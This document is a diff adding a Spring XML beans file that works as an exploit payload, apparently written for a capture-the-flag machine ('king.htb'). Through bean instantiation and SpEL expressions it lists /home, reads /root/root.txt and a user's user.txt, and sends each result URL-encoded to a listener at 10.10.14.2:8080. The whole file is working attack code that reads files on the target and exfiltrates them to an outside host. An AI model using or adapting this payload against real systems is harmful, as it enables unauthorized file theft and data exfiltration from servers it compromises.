@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+
+    <!-- Enumerate /home directory -->
+    <bean id="homeDir" class="java.io.File">
+        <constructor-arg value="/home"/>
+    </bean>
+    <bean id="homeList" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+        <property name="targetObject" ref="homeDir"/>
+        <property name="targetMethod" value="list"/>
+    </bean>
+    <bean id="homeStr" class="java.util.Arrays" factory-method="toString">
+        <constructor-arg ref="homeList"/>
+    </bean>
+    <bean id="homeUrl" class="java.net.URL" depends-on="homeStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/home?v=' + T(java.net.URLEncoder).encode(''+@homeStr,'UTF-8')}"/>
+    </bean>
+    <bean id="homeReq" factory-bean="homeUrl" factory-method="openStream" depends-on="homeUrl"/>
+
+    <!-- Try to read /root/root.txt -->
+    <bean id="rootRes" class="org.springframework.core.io.FileSystemResource" depends-on="homeReq">
+        <constructor-arg value="/root/root.txt"/>
+    </bean>
+    <bean id="rootStream" factory-bean="rootRes" factory-method="getInputStream"/>
+    <bean id="rootBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="rootStream"/>
+    </bean>
+    <bean id="rootContent" class="java.lang.String">
+        <constructor-arg ref="rootBytes"/>
+    </bean>
+    <bean id="rootUrl" class="java.net.URL" depends-on="rootContent">
+        <constructor-arg value="#{'http://10.10.14.2:8080/root?v=' + T(java.net.URLEncoder).encode(@rootContent,'UTF-8')}"/>
+    </bean>
+    <bean id="rootReq" factory-bean="rootUrl" factory-method="openStream" depends-on="rootUrl"/>
+
+    <!-- Try to read svc_mq user.txt -->
+    <bean id="userRes" class="org.springframework.core.io.FileSystemResource" depends-on="rootReq">
+        <constructor-arg value="/home/svc_mq@king.htb/user.txt"/>
+    </bean>
+    <bean id="userStream" factory-bean="userRes" factory-method="getInputStream"/>
+    <bean id="userBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="userStream"/>
+    </bean>
+    <bean id="userContent" class="java.lang.String">
+        <constructor-arg ref="userBytes"/>
+    </bean>
+    <bean id="userUrl" class="java.net.URL" depends-on="userContent">
+        <constructor-arg value="#{'http://10.10.14.2:8080/user?v=' + T(java.net.URLEncoder).encode(@userContent,'UTF-8')}"/>
+    </bean>
+    <bean id="userReq" factory-bean="userUrl" factory-method="openStream" depends-on="userUrl"/>
+
+</beans>
